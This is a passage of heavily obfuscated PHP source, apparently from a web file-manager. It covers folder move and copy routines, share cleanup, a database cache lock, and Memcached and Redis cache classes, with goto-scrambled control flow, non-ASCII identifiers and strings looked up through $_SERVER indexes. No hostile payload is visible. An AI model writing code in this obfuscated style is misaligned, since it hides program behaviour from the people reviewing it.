$Eæ—Ìó“Ì[$E¢å…„ñ®[78]]); if ($cõË’‘œÊ») { $FïÆ×¸„‰®[$E¢å…„ñ®[529]][] = $Eæ—Ìó“Ì[$E¢å…„ñ®[447]]; } else { $fŒ±¶¶á²¼ = !0; } } } } } if ($fŒ±¶¶á²¼ && !$FïÆ×¸„‰®[$E¢å…„ñ®[560]]) { $FïÆ×¸„‰®[$E¢å…„ñ®[560]] = !0; } goto CæÙñª‹ÙÄ; D¥ÈßÆ¨³: $this->lockWriteStart($C†ããğ¼Ëª, $CªÄøÏğŒ); if (!$B÷Ñ’ùÎ¡) { return $this->_moveForce($C˜™ïÄÇ™ì, $C†ããğ¼Ëª, $CªÄøÏğŒ); } $eùñ¸ˆŞ‰Ë = $B÷Ñ’ùÎ¡; goto bª‹‰“©ƒ§; Cã™àãòåÒ: $CªÄøÏğŒ = $F“ˆµæÛë¹ ? $F“ˆµæÛë¹ : $Eæ—Ìó“Ì[$E¢å…„ñ®[28]]; $B÷Ñ’ùÎ¡ = $this->fileNameExistCache($C†ããğ¼Ëª, $CªÄøÏğŒ); $this->lockMoveStart($C˜™ïÄÇ™ì); goto D¥ÈßÆ¨³; CæÙñª‹ÙÄ: return $eùñ¸ˆŞ‰Ë; goto fêÂÕà‘ÒØ; fêÂÕà‘ÒØ: } private function _moveForce($Béçôï¢ê„, $b®Ñ¦Éå†«, $dÌ—ã¡Ê´ì) { goto Bè÷Ê÷í­; A˜¸Æ‰ô¦ª: if (!$e“Îñ²Ø¯´ && $this->moveClearAuth) { Model($a¼ù¼ÕÄÌó[482])->authClear($Béçôï¢ê„); } $fâŸŒö‡è¬ = $dí¾áÖâŒ[$a¼ù¼ÕÄÌó[423]] == $a¼ù¼ÕÄÌó[87] && $cé“†Ú£Ùó[$a¼ù¼ÕÄÌó[423]] != $a¼ù¼ÕÄÌó[87]; if ($fâŸŒö‡è¬) { $FÛ¼á‚†’¼[$a¼ù¼ÕÄÌó[422]] = 0; } goto DÓÜ¾“ÊŞ‚; c‹©‰ëÚæ : $B¡‰”è = $dí¾áÖâŒ[$a¼ù¼ÕÄÌó[403]] == $a¼ù¼ÕÄÌó[87]; $FÛ¼á‚†’¼ = array($a¼ù¼ÕÄÌó[394] => $cé“†Ú£Ùó[$a¼ù¼ÕÄÌó[395]], $a¼ù¼ÕÄÌó[553] => $cé“†Ú£Ùó[$a¼ù¼ÕÄÌó[487]] . $cé“†Ú£Ùó[$a¼ù¼ÕÄÌó[395]] . $a¼ù¼ÕÄÌó[47], $a¼ù¼ÕÄÌó[549] => $cé“†Ú£Ùó[$a¼ù¼ÕÄÌó[404]], $a¼ù¼ÕÄÌó[550] => $cé“†Ú£Ùó[$a¼ù¼ÕÄÌó[484]], $a¼ù¼ÕÄÌó[552] => USER_ID, $a¼ù¼ÕÄÌó[413] => $dÌ—ã¡Ê´ì); $e“Îñ²Ø¯´ = $dí¾áÖâŒ[$a¼ù¼ÕÄÌó[404]] == SourceModel::TYPE_GROUP && $cé“†Ú£Ùó[$a¼ù¼ÕÄÌó[404]] == SourceModel::TYPE_GROUP && $dí¾áÖâŒ[$a¼ù¼ÕÄÌó[484]] == $cé“†Ú£Ùó[$a¼ù¼ÕÄÌó[484]]; goto A˜¸Æ‰ô¦ª; Bè÷Ê÷í­: $a¼ù¼ÕÄÌó =& $_SERVER[ÒÆ›ÆØÎ¾]; $dí¾áÖâŒ = $this->sourceInfo($Béçôï¢ê„); $cé“†Ú£Ùó = $this->sourceInfo($b®Ñ¦Éå†«); goto c‹©‰ëÚæ ; DÓÜ¾“ÊŞ‚: if ($B¡‰”è) { $B«ƒ½¿†­ = array($a¼ù¼ÕÄÌó[553] => array($a¼ù¼ÕÄÌó[512], $dí¾áÖâŒ[$a¼ù¼ÕÄÌó[487]] . $dí¾áÖâŒ[$a¼ù¼ÕÄÌó[395]] . $a¼ù¼ÕÄÌó[513])); $EŒ°‰Ô–Ğ = $dí¾áÖâŒ[$a¼ù¼ÕÄÌó[487]] . $dí¾áÖâŒ[$a¼ù¼ÕÄÌó[395]] . $a¼ù¼ÕÄÌó[47]; $FÙ‘ì–ÙÖ = $cé“†Ú£Ùó[$a¼ù¼ÕÄÌó[487]] . $cé“†Ú£Ùó[$a¼ù¼ÕÄÌó[395]] . $a¼ù¼ÕÄÌó[47] . $dí¾áÖâŒ[$a¼ù¼ÕÄÌó[395]] . $a¼ù¼ÕÄÌó[47]; $bñó‹£ÍŞ = array($a¼ù¼ÕÄÌó[553] => array($a¼ù¼ÕÄÌó[561], "\x72\145\x70\154\141\143\x65\50\160\x61\x72\145\x6e\164\x4c\145\x76\145\x6c\54\47{$EŒ°‰Ô–Ğ}\x27\54\x27{$FÙ‘ì–ÙÖ}\x27\51"), $a¼ù¼ÕÄÌó[549] => $cé“†Ú£Ùó[$a¼ù¼ÕÄÌó[404]], $a¼ù¼ÕÄÌó[550] => $cé“†Ú£Ùó[$a¼ù¼ÕÄÌó[484]]); if ($fâŸŒö‡è¬) { $bñó‹£ÍŞ[$a¼ù¼ÕÄÌó[422]] = 0; } $this->where($B«ƒ½¿†­)->data($bñó‹£ÍŞ)->save(); } $this->where(array($a¼ù¼ÕÄÌó[410] => $Béçôï¢ê„))->data($FÛ¼á‚†’¼)->save(); return $Béçôï¢ê„; goto C¯Ïİ™ìä¢; C¯Ïİ™ìä¢: } private function clearShare($d”¯‹Ãì‹±, $bÖé‚ˆ©¿) { goto b¦Ç¤Òî¿; CÖÊ·å¹Ó: if (!$DÓØïÕæà´) { return; } $cãöŸ¬ù«â = array($aŸæ´ğß²â[395] => array($aŸæ´ğß²â[7], $DÓØïÕæà´), $aŸæ´ğß²â[475] => 1); $CÙ¦‹ÜŸªÎ = Model($aŸæ´ğß²â[563])->field($aŸæ´ğß²â[468])->where($cãöŸ¬ù«â)->select(); goto B•àÇÂ§Ê; BœÜİ‘Ÿ¨: Model($aŸæ´ğß²â[563])->where($cãöŸ¬ù«â)->save(array($aŸæ´ğß²â[475] => 0)); Model($aŸæ´ğß²â[564])->where($cãöŸ¬ù«â)->delete(); goto E¡°ª¼±Ã; b¦Ç¤Òî¿: $aŸæ´ğß²â =& $_SERVER[ÒÆ›ÆØÎ¾]; $D±ÇÜ‘¶„§ = $this->sourceInfo($d”¯‹Ãì‹±); $C‘°õÚ¤ÎŸ = $this->sourceInfo($bÖé‚ˆ©¿); goto fÈâ«èñ§¸; B•àÇÂ§Ê: if (!$CÙ¦‹ÜŸªÎ) { return; } $CÙ¦‹ÜŸªÎ = array_to_keyvalue($CÙ¦‹ÜŸªÎ, $aŸæ´ğß²â[33], $aŸæ´ğß²â[468]); $cãöŸ¬ù«â = array($aŸæ´ğß²â[468] => array($aŸæ´ğß²â[7], $CÙ¦‹ÜŸªÎ)); goto BœÜİ‘Ÿ¨; fÈâ«èñ§¸: if ($D±ÇÜ‘¶„§[$aŸæ´ğß²â[484]] == $C‘°õÚ¤ÎŸ[$aŸæ´ğß²â[484]] && $D±ÇÜ‘¶„§[$aŸæ´ğß²â[404]] == $aŸæ´ğß²â[562]) { return; } $cãöŸ¬ù«â = array($aŸæ´ğß²â[487] => array($aŸæ´ğß²â[512], $D±ÇÜ‘¶„§[$aŸæ´ğß²â[487]] . $d”¯‹Ãì‹± . $aŸæ´ğß²â[513])); $DÓØïÕæà´ = $this->field($aŸæ´ğß²â[410])->where($cãöŸ¬ù«â)->getField($aŸæ´ğß²â[395], !0); goto CÖÊ·å¹Ó; E¡°ª¼±Ã: } public function copyFolderFromIO($EÍ¶‹ÓÃğÇ, $C›ï÷š´Ùì, $FÏ¼–òÜ£–, $aÜ¬¸ÒÂ°§, $Bà¹Æ‰£ÔŠ, $fÊ…ˆ‘ñ— = false) { goto F±’›ÄœÍŒ; föÛ—ÉìÂ‰: Model($A¸Ô¢ññÒ[450])->linkAdd($bµåßâ±Ø…[$A¸Ô¢ññÒ[529]]); Model($A¸Ô¢ññÒ[450])->remove($bµåßâ±Ø…[$A¸Ô¢ññÒ[565]]); $this->folderSizeReset($FÏ¼–òÜ£–); goto dâÖ¯Ä™ƒ; c¢Î„«Æğ: Hook::trigger($A¸Ô¢ññÒ[567]); if ($d¥Ìù ¨«) { $this->folderSizeResetChildren($d¥Ìù ¨«); } $this->_childrenListClear(); goto C›Ğ¦Àßä¦; A÷…°¡ßÆ: $AãÕÌÕâï¨ = $this->fileNameExist($FÏ¼–òÜ£–, $dù³÷ÑòÜÅ); $d¥Ìù ¨« = $this->mkdir($FÏ¼–òÜ£–, $dù³÷ÑòÜÅ, $aÜ¬¸ÒÂ°§); if (!$AãÕÌÕâï¨ || $aÜ¬¸ÒÂ°§ == REPEAT_RENAME_FOLDER) { $aÜ¬¸ÒÂ°§ = !1; } goto D£ØŞ¢¹¡‰; C›Ğ¦Àßä¦: Model($A¸Ô¢ññÒ[532])->addAll($bµåßâ±Ø…[$A¸Ô¢ññÒ[530]], array(), !0); Model($A¸Ô¢ññÒ[533])->eventCopy($d¥Ìù ¨«); $this->saveAll($bµåßâ±Ø…[$A¸Ô¢ññÒ[531]]); goto föÛ—ÉìÂ‰; dâÖ¯Ä™ƒ: $this->updateModifyTime($FÏ¼–òÜ£–); return $d¥Ìù ¨«; goto bÊ’‘¹ˆ„; F±’›ÄœÍŒ: $A¸Ô¢ññÒ =& $_SERVER[ÒÆ›ÆØÎ¾]; $bµåßâ±Ø… = array($A¸Ô¢ññÒ[530] => array(), $A¸Ô¢ññÒ[531] => array(), $A¸Ô¢ññÒ[529] => array(), $A¸Ô¢ññÒ[565] => array()); $dù³÷ÑòÜÅ = $fÊ…ˆ‘ñ— ? $fÊ…ˆ‘ñ— : $EÍ¶‹ÓÃğÇ->pathThis($C›ï÷š´Ùì); goto A÷…°¡ßÆ; D£ØŞ¢¹¡‰: if ($AãÕÌÕâï¨) { $this->_childrenAllMake($AãÕÌÕâï¨); } Hook::trigger($A¸Ô¢ññÒ[566]); $this->_copyChildTo($EÍ¶‹ÓÃğÇ, $C›ï÷š´Ùì, $d¥Ìù ¨«, $aÜ¬¸ÒÂ°§, $bµåßâ±Ø…, $Bà¹Æ‰£ÔŠ); goto c¢Î„«Æğ; bÊ’‘¹ˆ„: } private function _copyChildTo($CášÒë”¶, $f‚Ò¤©õ¦ñ, $Aë‘ßÁ¦ƒ¶, $aÙªÖ„Ğá©, &$DëŒàöÎ, $B…¡éÂ²¬È) { goto f†Ãñİçøï; eˆÆ£’«–å: $d’óÖÑô®í = array(); foreach ($AñÉ°‹éÏ¿ as &$d´ÓŠÙ¡µ) { goto F©­ÀÌ—ã; fï‹›ìŠñ•: if ($aÙªÖ„Ğá©) { $a»İŸ…Ï» = $this->fileNameExistCache($Aë‘ßÁ¦ƒ¶, $d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[28]]); if ($a»İŸ…Ï») { if ($d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[403]] || $aÙªÖ„Ğá© == REPEAT_SKIP) { continue; } if ($aÙªÖ„Ğá© == REPEAT_REPLACE) { $aŠ¾‹×­¼ = $this->sourceInfoCache($a»İŸ…Ï»); $AÙîÏôÚ«Á = $this->fileHistory($aŠ¾‹×­¼, $d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[447]], $d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[78]]); if ($AÙîÏôÚ«Á) { $DëŒàöÎ[$a•ˆ†ê¤Û[529]][] = $d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[447]]; } continue; } else { if ($aÙªÖ„Ğá© == REPEAT_RENAME) { $d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[28]] = $this->fileNameAutoCache($Aë‘ßÁ¦ƒ¶, $d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[28]], $aÙªÖ„Ğá©, !1); } } } } if (!$d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[403]] && $d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[447]]) { $DëŒàöÎ[$a•ˆ†ê¤Û[529]][] = $d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[447]]; } $d’óÖÑô®í[] = $this->_makeItemData($d´ÓŠÙ¡µ, $aˆ‘æ»±Ç½, $d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[28]]); goto a·ï¼ÑÒÏ; Fá²Ôã ÍÀ: $d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[78]] = _get($d´ÓŠÙ¡µ, $a•ˆ†ê¤Û[78], 0); $d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[447]] = _get($d´ÓŠÙ¡µ, $a•ˆ†ê¤Û[447], 0); if (!isset($d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[568]]) && $d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[447]]) { $DëŒàöÎ[$a•ˆ†ê¤Û[565]][] = $d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[447]]; } goto fï‹›ìŠñ•; F©­ÀÌ—ã: if (isset($FÍá¿ È¶Î[$d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[28]]])) { $d´ÓŠÙ¡µ = $FÍá¿ È¶Î[$d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[28]]]; } $d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[403]] = $d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[29]] == $a•ˆ†ê¤Û[77]; $d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[405]] = _get($d´ÓŠÙ¡µ, $a•ˆ†ê¤Û[168], $a•ˆ†ê¤Û[33]); goto Fá²Ôã ÍÀ; a·ï¼ÑÒÏ: } unset($d´ÓŠÙ¡µ); goto Aœ×¯ëîêê; AÑõ¯·‘À¤: foreach ($AñÉ°‹éÏ¿ as $d´ÓŠÙ¡µ) { $aŠ¾‹×­¼ = $AËÉ£§²²[$d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[28]]]; $díŒß´Û¥› = $aŠ¾‹×­¼[$a•ˆ†ê¤Û[395]]; $this->_copyApplyMeta($aŠ¾‹×­¼, $DëŒàöÎ); if ($d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[29]] == $a•ˆ†ê¤Û[77]) { $d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[76]] = $CášÒë”¶->getPathInner($d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[76]]); $this->_copyChildTo($CášÒë”¶, $d´ÓŠÙ¡µ[$a•ˆ†ê¤Û[76]], $díŒß´Û¥›, $aÙªÖ„Ğá©, $DëŒàöÎ, $B…¡éÂ²¬È); } } goto d–ÔÀÓÁ˜É; BÕÌ¢–àİ’: $Bğ¼ô“Ûö§ = $Bğ¼ô“Ûö§ ? $Bğ¼ô“Ûö§ : array($a•ˆ†ê¤Û[74] => array(), $a•ˆ†ê¤Û[75] => array()); $AñÉ°‹éÏ¿ = array_merge($Bğ¼ô“Ûö§[$a•ˆ†ê¤Û[74]], $Bğ¼ô“Ûö§[$a•ˆ†ê¤Û[75]]); $FÍá¿ È¶Î = $this->_addFiles($CášÒë”¶, $Bğ¼ô“Ûö§[$a•ˆ†ê¤Û[74]], $B…¡éÂ²¬È); goto eˆÆ£’«–å; f†Ãñİçøï: $a•ˆ†ê¤Û =& $_SERVER[ÒÆ›ÆØÎ¾]; $aˆ‘æ»±Ç½ = $this->sourceInfoCache($Aë‘ßÁ¦ƒ¶); $Bğ¼ô“Ûö§ = $CášÒë”¶->listPath($f‚Ò¤©õ¦ñ); goto BÕÌ¢–àİ’; Aœ×¯ëîêê: if (!empty($d’óÖÑô®í)) { $this->addAll($d’óÖÑô®í); $this->_childrenListSelect($Aë‘ßÁ¦ƒ¶); } $AËÉ£§²² = $this->_childrenList($Aë‘ßÁ¦ƒ¶); $AËÉ£§²² = array_to_keyvalue($AËÉ£§²², $a•ˆ†ê¤Û[28]); goto AÑõ¯·‘À¤; d–ÔÀÓÁ˜É: } private function _addFiles($f”¦‡–îå, $AÖ‡¦Ùù, $eÂñòÕ‡Ó¿) { goto EÎïŠÛï’î; fŞ¨¬Í¢–ì: $e¥¤‚Äô²· = $e¥¤‚Äô²· ? $e¥¤‚Äô²· : array(); foreach ($e¥¤‚Äô²· as $FÂÊ‘ğäŠ») { if (!isset($BÍæ†®Ö”®[$FÂÊ‘ğäŠ»[$e°šè©†›[170]]])) { continue; } $BŠ–Ùˆø† =& $BÍæ†®Ö”®[$FÂÊ‘ğäŠ»[$e°šè©†›[170]]]; foreach ($BŠ–Ùˆø† as &$b±ëÉÁæ»Ğ) { $b±ëÉÁæ»Ğ[$e°šè©†›[447]] = $FÂÊ‘ğäŠ»[$e°šè©†›[447]]; } unset($b±ëÉÁæ»Ğ); } $cì¥›áÒ¿½ = array(); goto eËÈöŠïñŸ; EÎïŠÛï’î: $e°šè©†› =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$AÖ‡¦Ùù || count($AÖ‡¦Ùù) == 0) { return array(); } $BÍæ†®Ö”® = array(); goto eÇßö ƒë«; eî”ëÖ†ïñ: foreach ($e¥¤‚Äô²· as $FÂÊ‘ğäŠ») { if (!isset($BÍæ†®Ö”®[$FÂÊ‘ğäŠ»[$e°šè©†›[170]]])) { continue; } $DÁ·£Ëğ«– = $BÍæ†®Ö”®[$FÂÊ‘ğäŠ»[$e°šè©†›[170]]]; foreach ($DÁ·£Ëğ«– as &$b±ëÉÁæ»Ğ) { $b±ëÉÁæ»Ğ[$e°šè©†›[447]] = $FÂÊ‘ğäŠ»[$e°šè©†›[447]]; $b±ëÉÁæ»Ğ[$e°šè©†›[568]] = !0; } unset($b±ëÉÁæ»Ğ); } $c¢ˆóĞÀ×“ = array(); foreach ($AÖ‡¦Ùù as $EÂõÚÖšŠ) { if (isset($EÂõÚÖšŠ[$e°šè©†›[568]]) && $EÂõÚÖšŠ[$e°šè©†›[568]]) { continue; } $e§ÒŒ’ˆˆ´ = $f”¦‡–îå->getPathInner($EÂõÚÖšŠ[$e°šè©†›[76]]); $C¤÷Ğ¹Ü£× = $f ñÄµ…->addFileMake($e§ÒŒ’ˆˆ´, $EÂõÚÖšŠ[$e°šè©†›[78]], $EÂõÚÖšŠ[$e°šè©†›[171]], $EÂõÚÖšŠ[$e°šè©†›[170]], $EÂõÚÖšŠ[$e°šè©†›[28]], $eÂñòÕ‡Ó¿); $c¢ˆóĞÀ×“[] = $C¤÷Ğ¹Ü£×; } goto C±ùÎ ºï¼; eÇßö ƒë«: foreach ($AÖ‡¦Ùù as &$b±ëÉÁæ»Ğ) { goto fËó¥ùóÇ; fËó¥ùóÇ: Hook::trigger($e°šè©†›[569], $b±ëÉÁæ»Ğ); $b±ëÉÁæ»Ğ[$e°šè©†›[76]] = $f”¦‡–îå->getPathInner($b±ëÉÁæ»Ğ[$e°šè©†›[76]]); $Cêãõ¯—ÀÁ = $f”¦‡–îå->hashSimple($b±ëÉÁæ»Ğ[$e°šè©†›[76]]); goto cÉ‘­¤Êø¥; Bêá¾øÉ“: if (count($BÍæ†®Ö”®[$aïºè¤›õ„]) > 1) { $b±ëÉÁæ»Ğ[$e°šè©†›[568]] = !0; } goto d•åİåŸĞ; BäØ…ø¢Î†: $b±ëÉÁæ»Ğ[$e°šè©†›[170]] = $aïºè¤›õ„; Hook::trigger($e°šè©†›[570], $b±ëÉÁæ»Ğ); $BÍæ†®Ö”®[$aïºè¤›õ„][] =& $b±ëÉÁæ»Ğ; goto Bêá¾øÉ“; cÉ‘­¤Êø¥: $aïºè¤›õ„ = $f”¦‡–îå->hashMd5($b±ëÉÁæ»Ğ[$e°šè©†›[76]]); if (strlen($aïºè¤›õ„) > 10 && !isset($BÍæ†®Ö”®[$aïºè¤›õ„])) { $BÍæ†®Ö”®[$aïºè¤›õ„] = array(); } $b±ëÉÁæ»Ğ[$e°šè©†›[171]] = $Cêãõ¯—ÀÁ; goto BäØ…ø¢Î†; d•åİåŸĞ: } unset($b±ëÉÁæ»Ğ); $bŠˆŠï×¹Ç = array($e°šè©†›[170] => array($e°šè©†›[7], array_keys($BÍæ†®Ö”®))); goto cÙÑ··­›; eËÈöŠïñŸ: foreach ($AÖ‡¦Ùù as $dÌÕé„©É§) { $cì¥›áÒ¿½[$dÌÕé„©É§[$e°šè©†›[28]]] = $dÌÕé„©É§; } return $cì¥›áÒ¿½; goto DêôØĞ‚Ú¤; cÙÑ··­›: $f ñÄµ… = Model($e°šè©†›[571]); $e¥¤‚Äô²· = $f ñÄµ…->where($bŠˆŠï×¹Ç)->select(); $e¥¤‚Äô²· = $e¥¤‚Äô²· ? $e¥¤‚Äô²· : array(); goto eî”ëÖ†ïñ; C±ùÎ ºï¼: $f ñÄµ…->addAll($c¢ˆóĞÀ×“); $bŠˆŠï×¹Ç = array($e°šè©†›[170] => array($e°šè©†›[7], array_keys($BÍæ†®Ö”®))); $e¥¤‚Äô²· = $f ñÄµ…->where($bŠˆŠï×¹Ç)->select(); goto fŞ¨¬Í¢–ì; DêôØĞ‚Ú¤: } } define($_SERVER[ÒÆ›ÆØÎ¾][572], $_SERVER[ÒÆ›ÆØÎ¾][573]); goto FİÇÃ±ˆ‡; bÓ‹­ƒëØ: class CacheLockDatabase { public function lock($eÇ¿ª˜²·, $cŒ‰œŒƒöÓ = 0) { $Fõˆ÷ÚÓ˜¯ = Model($_SERVER[ÒÆ›ÆØÎ¾][793]); $A¹¤ªÙ’³– = microtime(!0) + $cŒ‰œŒƒöÓ; while (microtime(!0) < $A¹¤ªÙ’³–) { $EåÊÜ´Ğ‡© = $Fõˆ÷ÚÓ˜¯->get($eÇ¿ª˜²·); if (!$EåÊÜ´Ğ‡© || $EåÊÜ´Ğ‡© < microtime(!0)) { $Dñ‘„¹Ñôë = $Fõˆ÷ÚÓ˜¯->set($eÇ¿ª˜²·, $A¹¤ªÙ’³–); if ($Dñ‘„¹Ñôë) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($f´º­…ó‚‚) { return Model($_SERVER[ÒÆ›ÆØÎ¾][793])->get($f´º­…ó‚‚); } public function unlock($C Ê ¯Å³º) { Model($_SERVER[ÒÆ›ÆØÎ¾][793])->remove($C Ê ¯Å³º); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($A…Öï’²§“, $aè‚Ü‰æœÖ) { $f«Ô¤¶²µ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!class_exists($f«Ô¤¶²µ[820])) { show_json($f«Ô¤¶²µ[821], !1); } $this->cacheTime = $aè‚Ü‰æœÖ; $this->handle = new Memcached(); if (is_array($A…Öï’²§“[$f«Ô¤¶²µ[822]]) && count($A…Öï’²§“[$f«Ô¤¶²µ[822]]) >= 1) { foreach ($A…Öï’²§“[$f«Ô¤¶²µ[822]] as $C½‹Ô½é¤) { $CÌÃåÉÜà´ = explode($f«Ô¤¶²µ[4], $C½‹Ô½é¤); $this->handle->addServer($CÌÃåÉÜà´[0], $CÌÃåÉÜà´[1]); } } else { $this->handle->addServer($A…Öï’²§“[$f«Ô¤¶²µ[175]], $A…Öï’²§“[$f«Ô¤¶²µ[176]]); } } public function set($bŒæÍƒÅ“, $cœÌğ©Ä–, $cÄ«ñÍ¡Çí = false) { $cÄ«ñÍ¡Çí = $cÄ«ñÍ¡Çí ? $cÄ«ñÍ¡Çí : $this->cacheTime; return $this->handle->set($bŒæÍƒÅ“, $cœÌğ©Ä–, $cÄ«ñÍ¡Çí); } public function get($bŒ©‚íîåØ) { return $this->handle->get($bŒ©‚íîåØ); } public function remove($dŒëáá¸õ) { return $this->handle->delete($dŒëáá¸õ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($AÙ‘ÃÄØ…, $C¤˜ÔÛ‰Ö¤) { $d¥Âî×†ŠÁ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!class_exists($d¥Âî×†ŠÁ[823])) { show_json($d¥Âî×†ŠÁ[824], !1); } $this->cacheTime = $C¤˜ÔÛ‰Ö¤; $eÚºÖïÛà = isset($AÙ‘ÃÄØ…[$d¥Âî×†ŠÁ[825]]) ? $AÙ‘ÃÄØ…[$d¥Âî×†ŠÁ[825]] : 10; $BÉºßƒµŸ¬ = _get($AÙ‘ÃÄØ…, $d¥Âî×†ŠÁ[822]); if ($BÉºßƒµŸ¬ && is_array($BÉºßƒµŸ¬)) { $this->initCluster($AÙ‘ÃÄØ…, $eÚºÖïÛà); } else { $this->handle = $this->init($AÙ‘ÃÄØ…, $eÚºÖïÛà); } } private function init($B•„ù±Ïä¬, $D™®œ„î‡ô) { $EàŞ‘ï›İ¸ =& $_SERVER[ÒÆ›ÆØÎ¾]; $eá’ìÛ¥Û = new Redis(); $D‘‰®ô·¾ = isset($B•„ù±Ïä¬[$EàŞ‘ï›İ¸[826]]) ? $B•„ù±Ïä¬[$EàŞ‘ï›İ¸[826]] : !1; if ($D‘‰®ô·¾) { $eá’ìÛ¥Û->pconnect($B•„ù±Ïä¬[$EàŞ‘ï›İ¸[175]], $B•„ù±Ïä¬[$EàŞ‘ï›İ¸[176]], $D™®œ„î‡ô); } else { $eá’ìÛ¥Û->connect($B•„ù±Ïä¬[$EàŞ‘ï›İ¸[175]], $B•„ù±Ïä¬[$EàŞ‘ï›İ¸[176]], $D™®œ„î‡ô); } if (!empty($B•„ù±Ïä¬[$EàŞ‘ï›İ¸[406]])) { $eá’ìÛ¥Û->auth($B•„ù±Ïä¬[$EàŞ‘ï›İ¸[406]]); } return $eá’ìÛ¥Û; } private function initCluster($DÉèª‡¹˜Ö, $bµ÷‰´ÁÑ…) { $CÒ˜ÍÍŸ¯Ü =& $_SERVER[ÒÆ›ÆØÎ¾]; $DÛ„Ëé˜¾ = array($CÒ˜ÍÍŸ¯Ü[827], $CÒ˜ÍÍŸ¯Ü[828], $CÒ˜ÍÍŸ¯Ü[829]); $B‘³¾÷ ¶õ = $CÒ˜ÍÍŸ¯Ü[827]; if (isset($DÉèª‡¹˜Ö[$CÒ˜ÍÍŸ¯Ü[12]]) && in_array($DÉèª‡¹˜Ö[$CÒ˜ÍÍŸ¯Ü[12]], $DÛ„Ëé˜¾)) { $B‘³¾÷ ¶õ = $DÉèª‡¹˜Ö[$CÒ˜ÍÍŸ¯Ü[12]]; } switch ($B‘³¾÷ ¶õ) { case $CÒ˜ÍÍŸ¯Ü[827]: $this->_slave($DÉèª‡¹˜Ö, $bµ÷‰´ÁÑ…); break; case $CÒ˜ÍÍŸ¯Ü[828]: break; case $CÒ˜ÍÍŸ¯Ü[829]: $this->isCluster = !0; $BÀäÕ»šëç = $DÉèª‡¹˜Ö[$CÒ˜ÍÍŸ¯Ü[822]]; $CÍèºò“×Å = isset($DÉèª‡¹˜Ö[$CÒ˜ÍÍŸ¯Ü[826]]) ? $DÉèª‡¹˜Ö[$CÒ˜ÍÍŸ¯Ü[826]] : !1; $F¯õ›š¬ëó = isset($DÉèª‡¹˜Ö[$CÒ˜ÍÍŸ¯Ü[406]]) ? $DÉèª‡¹˜Ö[$CÒ˜ÍÍŸ¯Ü[406]] : null; $this->handle = new RedisCluster(NUll, $BÀäÕ»šëç, $bµ÷‰´ÁÑ…, $bµ÷‰´ÁÑ…, $CÍèºò“×Å, $F¯õ›š¬ëó); break; default: break; } } private function _slave($a„ÑãºÙ³à, $b²‹·‘Ùˆí) { goto f¦ñ¾ãˆÛ; fğ¿ÆÈÒÎ: $this->filterConfig($a„ÑãºÙ³à, $aÎÚ¤ñÂÛ¬[$dÂ¬âîŸ™Ç]); $this->slaveHandle = $this->init($a„ÑãºÙ³à, $b²‹·‘Ùˆí); goto aššµ¦ÏÔ; FÕÓí¬é¯: unset($aÎÚ¤ñÂÛ¬[0]); if (empty($aÎÚ¤ñÂÛ¬)) { return; } $dÂ¬âîŸ™Ç = array_rand($aÎÚ¤ñÂÛ¬); goto fğ¿ÆÈÒÎ; f¦ñ¾ãˆÛ: $aÎÚ¤ñÂÛ¬ = $a„ÑãºÙ³à[$_SERVER[ÒÆ›ÆØÎ¾][822]]; $this->filterConfig($a„ÑãºÙ³à, $aÎÚ¤ñÂÛ¬[0]); $this->handle = $this->init($a„ÑãºÙ³à, $b²‹·‘Ùˆí); goto FÕÓí¬é¯; aššµ¦ÏÔ: } private function filterConfig(&$fÉ•õõÅ«, $fÂ¶ö×‡í›) { $FËòë„‘ =& $_SERVER[ÒÆ›ÆØÎ¾]; $dÉÜƒ­š·¹ = explode($FËòë„‘[4], $fÂ¶ö×‡í›); $A‡æÈ³¤”š = array($FËòë„‘[175] => $dÉÜƒ­š·¹[0], $FËòë„‘[176] => $dÉÜƒ­š·¹[1]); $fÉ•õõÅ« = array_merge($fÉ•õõÅ«, $A‡æÈ³¤”š); } public function set($aÌË²ÈŠßø, $eÍó’øŒ¸, $C¥äãÇ£Òç = false) { $C¥äãÇ£Òç = $C¥äãÇ£Òç ? $C¥äãÇ£Òç : $this->cacheTime; return $this->handle->setEx($aÌË²ÈŠßø, $C¥äãÇ£Òç, $eÍó’øŒ¸); } public function setLock($b’­Ûƒî•ì, $cÅ¿¡÷á›İ, $F‹¥µ‡¥Ó) { return $this->handle->setNX($b’­Ûƒî•ì, $cÅ¿¡÷á›İ); } public function get($fÅ‹ÅÊ¦“) { $cÈ’òÙˆÚ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $cÈ’òÙˆÚ->get($fÅ‹ÅÊ¦“); } public function remove($b¥‚¹‘ƒÙ) { return $this->handle->del($b¥‚¹‘ƒÙ); } public function deleteAll() { $dœ³Ä­–ª« =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($_SERVER[$dœ³Ä­–ª«[784]] != $_SERVER[$dœ³Ä­–ª«[830]]) { goto B®®¹´Ü³; BÆî£šâˆ¾: $C‰¯õ›áßÕ = 